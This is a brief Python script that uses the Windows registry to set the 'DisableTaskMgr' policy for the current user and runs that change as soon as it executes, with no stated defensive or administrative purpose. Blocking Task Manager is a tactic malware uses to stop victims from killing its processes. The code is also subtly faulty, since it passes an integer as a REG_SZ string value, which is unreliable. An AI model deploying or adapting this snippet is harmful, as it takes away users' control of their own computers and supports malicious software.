import winreg


def disable_task_manager():
    # Path to the explorer properties
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    # Name of the key
    registry_name = "DisableTaskMgr"
    # Value that the registry key is set to
    value = 1
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
    except WindowsError as e:
        print(e)


disable_task_manager()